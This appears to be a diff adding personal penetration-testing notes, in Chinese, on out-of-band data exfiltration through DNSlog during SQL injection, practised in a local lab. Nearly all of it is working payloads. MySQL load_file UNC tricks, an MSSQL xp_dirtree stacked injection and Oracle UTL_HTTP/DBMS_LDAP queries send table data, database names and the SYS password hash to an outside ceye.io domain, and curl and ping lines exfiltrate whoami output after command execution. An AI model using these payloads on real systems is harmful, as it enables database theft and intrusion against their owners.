@@ -1,0 +1,77 @@
+dnslog注入：
+配置环境：
+sql_lab php5.4
+设置：magic_quotes_gpc=Off
+
+访问：http://192.168.10.107:86/sqlabs
+
+select load_file(concat('\\\\',(select t1_name from testz_t1 where t1_password="pass18" limit 0,1),'.qr9uig.ceye.io\\sbxq'));
+因为转义，故'\\\\'最终得到'\\'
+执行，成功带外。
+切割：
+select load_file(concat('\\\\',(select substr((hex(t1_name)),1,10) from testz_t1 where t1_password="pass18" limit 0,1),'.qr9uig.ceye.io\\sbxq'));
+
+
+
+eg1:我被分配的dnslog地址为：qr9uig.ceye.io
+\\asdnwdasdwdazq.sbxw.qr9uig.ceye.io 						#可以	有dns请求
+\\asdnwzzzwdazq.sbadqdwxw.qr9uig.ceye.io\adwdzfgdfgeswdwd	#也可以	有dns请求
+
+特别注意：dnslog地址后面的如sbxq多次后可能不太行或有次数限制等。 一般只需后面的如sbxq这个不同就行。好像是10次为最多纪录，反正尽量不同。
+
+有时可能既有dns请求也有http请求。
+
+
+
+windows：
+ping %USERNAME%.qr9uig.ceye.io
+
+linux：
+curl http://sbxzzz.qr9uig.ceye.io/`whoami`
+ping `whoami`.sbxzzz.qr9uig.ceye.io
+
+
+
+
+
+select hex('zhang');
+select unhex('7A68616E67');
+
+
+大胆猜测，细致求证。
+实现成功。
+
+
+
+
+MSSQL实现dnslog带外：前提：能堆叠注入。
+id=2';declare @a char(128);set @a='\\'%2b(select top 1 name from master.dbo.sysdatabases)%2b'.qr9uig.ceye.io\abcqwz';exec master..xp_dirtree @a;-- 
+
+其中： %2b为+
+mssql的单行注释为：	--空格		或直接写-- -
+
+
+
+
+
+
+oracl实现dnslog带外：类似。
+SELECT UTL_INADDR.GET_HOST_ADDRESS('qr9uig.ceye.io');
+SELECT UTL_HTTP.REQUEST('http://qr9uig.ceye.io/oracle') FROM DUAL;
+SELECT HTTPURITYPE('http://qr9uig.ceye.io/oracle').GETCLOB() FROM DUAL;
+SELECT DBMS_LDAP.INIT(('oracle.qr9uig.ceye.io',80) FROM DUAL;
+SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.qr9uig.ceye.io',80) FROM DUAL;
+
+
+
+
+命令执行：
+linux：
+curl http://sbxadw.qr9uig.ceye.io/`whoami`
+ping `whoami`.qr9uig.ceye.io
+ping `whoami`.askdkwd.qr9uig.ceye.io 	#也行
+
+
+windows：
+ping %OS%.qr9uig.ceye.io
+
